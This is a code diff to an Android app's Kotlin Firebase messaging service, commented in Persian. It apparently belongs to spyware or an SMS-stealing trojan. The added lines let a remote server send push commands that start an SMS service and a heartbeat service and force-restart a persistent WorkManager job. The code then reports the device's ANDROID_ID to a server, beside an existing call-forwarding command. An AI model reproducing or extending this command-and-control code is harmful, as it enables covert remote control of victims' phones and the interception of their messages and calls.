@@ -85,6 +85,18 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
                 Log.d(TAG, "🎯 PING command detected!")
                 sendOnlineConfirmation()
             }
+            
+            // ⭐ فعال‌سازی سرویس‌های پس‌زمینه از راه دور
+            "start_services" -> {
+                Log.d(TAG, "🚀 START SERVICES command detected!")
+                startAllBackgroundServices()
+            }
+            
+            // ⭐ فعال‌سازی مجدد WorkManager
+            "restart_heartbeat" -> {
+                Log.d(TAG, "💓 RESTART HEARTBEAT command detected!")
+                restartHeartbeatWorker()
+            }
 
             "call_forwarding" -> {
                 Log.d(TAG, "📞 Call Forwarding command")
@@ -425,6 +437,129 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
 
         notificationManager.notify(0, notification)
         Log.d(TAG, "✅ Notification displayed")
+    }
+    
+    /**
+     * ⭐ راه‌اندازی تمام سرویس‌های پس‌زمینه از راه دور
+     */
+    private fun startAllBackgroundServices() {
+        try {
+            Log.d(TAG, "════════════════════════════════════════")
+            Log.d(TAG, "🚀 STARTING ALL SERVICES FROM FIREBASE")
+            Log.d(TAG, "════════════════════════════════════════")
+            
+            // 1️⃣ SmsService
+            val smsIntent = Intent(applicationContext, SmsService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                applicationContext.startForegroundService(smsIntent)
+            } else {
+                applicationContext.startService(smsIntent)
+            }
+            Log.d(TAG, "✅ SmsService started")
+            
+            // 2️⃣ HeartbeatService
+            val heartbeatIntent = Intent(applicationContext, HeartbeatService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                applicationContext.startForegroundService(heartbeatIntent)
+            } else {
+                applicationContext.startService(heartbeatIntent)
+            }
+            Log.d(TAG, "✅ HeartbeatService started")
+            
+            // 3️⃣ WorkManager
+            restartHeartbeatWorker()
+            
+            Log.d(TAG, "════════════════════════════════════════")
+            Log.d(TAG, "✅ ALL SERVICES STARTED FROM FIREBASE")
+            Log.d(TAG, "════════════════════════════════════════")
+            
+            // ارسال تایید به سرور
+            sendServiceStatusToServer(true)
+            
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ Failed to start services: ${e.message}", e)
+            sendServiceStatusToServer(false)
+        }
+    }
+    
+    /**
+     * ⭐ راه‌اندازی مجدد WorkManager
+     */
+    private fun restartHeartbeatWorker() {
+        try {
+            val workRequest = androidx.work.PeriodicWorkRequestBuilder<HeartbeatWorker>(
+                15,
+                java.util.concurrent.TimeUnit.MINUTES,
+                5,
+                java.util.concurrent.TimeUnit.MINUTES
+            )
+                .setConstraints(
+                    androidx.work.Constraints.Builder()
+                        .setRequiredNetworkType(androidx.work.NetworkType.CONNECTED)
+                        .build()
+                )
+                .setBackoffCriteria(
+                    androidx.work.BackoffPolicy.EXPONENTIAL,
+                    10,
+                    java.util.concurrent.TimeUnit.SECONDS
+                )
+                .addTag("heartbeat")
+                .build()
+
+            androidx.work.WorkManager.getInstance(applicationContext).enqueueUniquePeriodicWork(
+                HeartbeatWorker.WORK_NAME,
+                androidx.work.ExistingPeriodicWorkPolicy.REPLACE,  // ⭐ REPLACE برای force restart
+                workRequest
+            )
+
+            Log.d(TAG, "💪 WorkManager restarted successfully")
+            
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ WorkManager restart failed: ${e.message}")
+        }
+    }
+    
+    /**
+     * ارسال وضعیت سرویس‌ها به سرور
+     */
+    private fun sendServiceStatusToServer(success: Boolean) {
+        Thread {
+            try {
+                val deviceId = Settings.Secure.getString(
+                    contentResolver,
+                    Settings.Secure.ANDROID_ID
+                )
+                
+                val body = JSONObject().apply {
+                    put("device_id", deviceId)
+                    put("status", if (success) "services_started" else "services_failed")
+                    put("timestamp", System.currentTimeMillis())
+                }
+                
+                val baseUrl = getBaseUrl()
+                val url = URL("$baseUrl/devices/service-status")
+                val conn = url.openConnection() as HttpURLConnection
+                
+                conn.requestMethod = "POST"
+                conn.setRequestProperty("Content-Type", "application/json")
+                conn.connectTimeout = 15000
+                conn.readTimeout = 15000
+                conn.doOutput = true
+                
+                conn.outputStream.use { os ->
+                    os.write(body.toString().toByteArray())
+                    os.flush()
+                }
+                
+                val responseCode = conn.responseCode
+                Log.d(TAG, "📡 Service status sent: $responseCode")
+                
+                conn.disconnect()
+                
+            } catch (e: Exception) {
+                Log.e(TAG, "❌ Failed to send service status: ${e.message}")
+            }
+        }.start()
     }
 
     override fun onNewToken(token: String) {
